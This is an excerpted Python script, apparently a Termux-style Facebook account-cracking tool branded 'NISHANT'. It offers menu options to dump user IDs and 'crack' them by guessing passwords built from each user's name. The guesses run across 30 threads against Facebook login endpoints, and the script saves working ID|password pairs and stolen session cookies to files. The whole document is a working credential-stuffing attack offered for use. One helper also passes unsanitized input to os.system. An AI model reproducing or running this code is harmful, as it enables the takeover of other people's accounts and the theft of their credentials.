#!/usr/bin/python
#Original written By Muhmmad NISHANT
...
from concurrent.futures import ThreadPoolExecutor as NISHANTNISHANT
from string import * 
...
sys.stdout.write('\x1b]2; NISHANT\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m  
 ...
 ########  #######  ##     ## ####  ######  
    ...
    ##     #######  ##     ## ####  ######                                                                                                            
\033[1;33m------------------------------------------------
\033[1;34m OWNER   :   NISHANT  HONE FERI ðŸ”¥
\033[1;37m FACEBOOK:   NISHANT SHOT
\033[1;37m GITHUB  :   DONNISHANT01
\033[1;36m VERSION :   TRY GARDAI XUH
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back NISHANT Menu ")
        exit()

def NISHANT():   
    os.system('clear')
    print(logo)
    print(f'[1]â€¢FILE CRACK')
    print(f'[2]â€¢PUBLIC ID CRACK')
    print(f'[3]â€¢RANDOM CRACK')
    print(f'[4]â€¢CREATE FILE')
    print(f'[6]â€¢LOGOUT COOKIE')
    print(f'[7]â€¢REMOVE TRASH FILE')
    print(f'[8]â€¢SEPRATE IDS')
    print(f'[9]â€¢REMOVE DUPIDS')
    print(f'[F]â€¢CONTACT ADMIN')  
    print('')
    select = input('SELECT MENU [â€¢] ')
    if select =='1':
        method_crack()
    elif select =='2':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NISHANT] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NISHANTb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NISHANTb};{ckkk}"
                    print(f"\r{R} [NISHANT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NISHANT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NISHANT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [NISHANT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NISHANT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NISHANT] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NISHANT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NISHANT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NISHANT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [NISHANT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NISHANT] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[NISHANT] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [NISHANT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NISHANT_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with NISHANTNISHANT(max_workers=30) as NISHANTworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                NISHANTworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                NISHANTworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                NISHANTworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                NISHANTworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/NISHANT.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/NISHANT.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    NISHANT = input('Put File Name :')
    print(" ")
    NISHANT= input('Saving Put File Name :')
    os.system('touch ' +NISHANT)
    os.system('sort -r '+NISHANT+' | uniq > '+NISHANT)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + NISHANT )
    print(47*'-')
    print("File Saved To :" + NISHANT)
    print(47*'-')
    input(f"{S} Press Enter To Back NISHANT Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/NISHANT.txt\n') 
        filepath = input("Put File Name: ")
